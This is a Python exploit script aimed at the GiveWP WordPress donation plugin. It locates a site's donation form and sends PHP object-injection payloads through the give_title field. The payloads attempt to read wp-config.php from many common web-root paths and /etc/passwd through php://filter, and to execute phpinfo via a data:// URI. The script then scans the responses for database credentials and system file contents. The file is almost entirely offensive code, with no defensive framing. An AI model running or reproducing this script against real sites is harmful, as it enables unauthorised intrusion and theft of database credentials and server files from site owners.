import requests
import json
import logging
import random
import string
from bs4 import BeautifulSoup


def generate_random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def find_donation_form(domain):
    url = f"https://{domain}"
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form', {'id': lambda x: x and x.startswith('give-form-')})
        if form:
            form_id = form.get('id').split('-')[-1]
            form_url = form.get('action')
            return form_id, form_url
    except Exception as e:
        logging.error(f"Error finding donation form: {str(e)}")
    return None, None


def prepare_path_discovery_payloads():
    base_paths = [
        "/var/www/html/",
        "/home/*/public_html/",
        "/usr/local/www/",
        "/opt/www/",
        "/var/www/vhosts/*/httpdocs/",
        "/srv/www/",
        "/var/www/",
    ]
    subpaths = ["", "wp-content/", "wordpress/", "wp/"]
    payloads = []
    for base in base_paths:
        for sub in subpaths:
            path = f"{base}{sub}wp-config.php"
            payload = f'O:5:"TCPDF":1:{{s:9:"imagekeys";a:1:{{i:0;s:{len(path)}:"{path}";}}}}'
            payloads.append(payload)

    payloads.extend([
        'O:5:"TCPDF":1:{s:9:"imagekeys";a:1:{i:0;s:13:"php://filter/convert.base64-encode/resource=/etc/passwd";}}',
        'O:5:"TCPDF":1:{s:9:"imagekeys";a:1:{i:0;s:29:"php://filter/resource=index.php";}}',
        'O:5:"TCPDF":1:{s:9:"imagekeys";a:1:{i:0;s:54:"data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==";}}',
    ])
    return payloads


def prepare_urls_and_data(domain, payload, form_id, form_url):
    urls = {
        "url1": f'https://{domain}/wp-admin/admin-ajax.php',
        "url2": form_url or f'https://{domain}/give/donation-form/?payment-mode=manual&form-id={form_id}'
    }

    first_name = generate_random_string()
    last_name = generate_random_string()
    email_prefix = generate_random_string()

    data = {
        'give-honeypot': '',
        'give-form-id-prefix': f'{form_id}-1',
        'give-form-id': form_id,
        'give-form-title': '0',
        'give-current-url': f'https://{domain}/',
        'give-form-url': urls["url2"],
        'give-form-minimum': '',
        'give-form-maximum': '999999.99',
        'give-form-hash': generate_random_string(32),
        'give-price-id': '1',
        'give-amount': '25',
        'give_first': first_name,
        'give_last': last_name,
        'give_email': f'{email_prefix}@test.com',
        'payment-mode': 'manual',
        'give_action': 'purchase',
        'give-gateway': 'manual',
        'give_embed_form': '1',
        'action': 'give_process_donation',
        'give_ajax': 'true',
        'give_title': payload
    }

    return urls, data


def send_exploit(domain):
    form_id, form_url = find_donation_form(domain)
    if not form_id:
        logging.error("Could not find donation form. Using default values.")
        form_id = '1719'
        form_url = None

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    session = requests.Session()
    payloads = prepare_path_discovery_payloads()

    for payload in payloads:
        urls, data = prepare_urls_and_data(domain, payload, form_id, form_url)
        try:
            logging.info(f"Sending request with payload: {payload[:50]}...")
            response = session.post(urls['url1'], headers=headers, data=data)
            logging.info(f"Request status: {response.status_code}")
            if analyze_response(response, payload):
                return True

            if response.status_code == 200:
                logging.info(f"Sending second request to {urls['url2']}")
                data2 = data.copy()
                data2.pop('give_ajax', None)
                data2.pop('action', None)
                response2 = session.post(urls['url2'], headers=headers, data=data2)
                logging.info(f"Second request status: {response2.status_code}")
                if analyze_response(response2, payload):
                    return True
        except requests.exceptions.RequestException as e:
            logging.error(f"Error sending request: {str(e)}")

    logging.info("No vulnerability found after trying all payloads.")
    return False


def analyze_response(response, payload):
    logging.info(f"Analyzing response from: {response.url}")
    logging.info(f"Status code: {response.status_code}")

    content_type = response.headers.get('Content-Type', '').lower()

    if 'application/json' in content_type:
        return analyze_json_response(response.text, payload)
    elif 'text/html' in content_type:
        return analyze_html_response(response.text, payload)
    else:
        logging.info(f"Unknown content type: {content_type}")
        return analyze_unknown_response(response.text, payload)


def analyze_json_response(content, payload):
    try:
        json_response = json.loads(content)
        logging.info("Response is in JSON format:")
        logging.info(json.dumps(json_response, indent=4))
        return check_for_path_info(json.dumps(json_response), payload)
    except json.JSONDecodeError:
        logging.warning("Response claims to be JSON but could not be parsed.")
        logging.info("Raw content:")
        logging.info(content[:1000])
        return check_for_path_info(content, payload)


def analyze_html_response(content, payload):
    soup = BeautifulSoup(content, 'html.parser')
    error_divs = soup.find_all('div', class_='give_error')
    for div in error_divs:
        error_message = div.get_text(strip=True)
        logging.warning(f"Error message found: {error_message}")

    return check_for_path_info(content, payload)


def analyze_unknown_response(content, payload):
    logging.info("Response is in an unknown format. Displaying raw content:")
    logging.info(content[:1000])
    return check_for_path_info(content, payload)


def check_for_path_info(content, payload):
    content = content.lower()

    if "/etc/passwd" in payload and "root:" in content:
        logging.info("Successfully read /etc/passwd. Server is vulnerable.")
        return True

    if "phpinfo()" in payload and ("php version" in content or "php.ini" in content):
        logging.info("Successfully executed phpinfo(). Server is vulnerable.")
        return True

    if "wp-config.php" in payload and ("db_name" in content or "db_user" in content):
        logging.info("Successfully accessed wp-config.php. Server is vulnerable.")
        return True

    path_indicators = ["/var/www/", "/home/", "/usr/local/", "/opt/", "/srv/"]
    for indicator in path_indicators:
        if indicator in content:
            logging.info(f"Possible path information found: {indicator}")
            return True

    if "open_basedir restriction in effect" in content:
        logging.info("open_basedir restriction detected. This might limit our ability to traverse directories.")

    return False